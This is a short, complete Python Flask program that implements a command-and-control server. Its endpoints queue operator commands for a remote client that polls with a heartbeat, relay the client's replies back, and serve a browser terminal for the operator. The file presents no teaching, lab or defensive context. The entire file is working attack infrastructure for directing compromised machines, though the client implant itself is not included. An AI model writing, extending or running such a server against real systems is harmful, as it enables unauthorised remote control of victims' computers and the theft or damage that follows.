from flask import Flask, render_template, request, jsonify
from queue import Queue
import time

class CommandAndControl:
    def __init__(self, SERVER_IP, SERVER_PORT):
        print("C2 Initialized")
        self.command_queue = Queue()
        self.response_queue = Queue()
        self.last_client_heartbeat = None # Track client connection
        self.app = Flask(__name__)
        self.add_routes()
        self.SERVER_IP = SERVER_IP
        self.SERVER_PORT = SERVER_PORT

    def add_routes(self):
        @self.app.route("/")
        def index():
            return "C2 Server is running"

        @self.app.route("/terminal", methods=["GET"])
        def terminal():
            return render_template("terminal.html")

        # API: Client polls for command (and sends a heartbeat)
        @self.app.route("/api/poll_command", methods=["GET"])
        def poll_command():
            self.last_client_heartbeat = time.time() # Update heartbeat timestamp
            if not self.command_queue.empty():
                cmd = self.command_queue.get()
                return jsonify({"command": cmd})
            return jsonify({"command": None})

        # API: Web UI checks client connection status
        @self.app.route("/api/status", methods=["GET"])
        def get_status():
            connected = False
            # Consider connected if heartbeat was within the last 15 seconds
            if self.last_client_heartbeat and (time.time() - self.last_client_heartbeat) < 15:
                connected = True
            return jsonify({"connected": connected})

        # API: Send command from web to client
        @self.app.route("/api/send_command", methods=["POST"])
        def send_command():
            cmd = request.json.get("command")
            if cmd:
                self.command_queue.put(cmd)
                return jsonify({"status": "sent"})
            return jsonify({"status": "error", "message": "No command"}), 400

        # API: Client posts response
        @self.app.route("/api/post_response", methods=["POST"])
        def post_response():
            resp = request.json.get("response")
            if resp:
                self.response_queue.put(resp)
                return jsonify({"status": "received"})
            return jsonify({"status": "error", "message": "No response"}), 400

        # API: Web polls for response
        @self.app.route("/api/get_response", methods=["GET"])
        def get_response():
            responses = []
            while not self.response_queue.empty():
                responses.append(self.response_queue.get())
            return jsonify({"responses": responses})

    def run(self):
        self.app.run(host=self.SERVER_IP, port=self.SERVER_PORT)

if __name__ == "__main__":
    CommandAndControl("0.0.0.0", 8080).run()
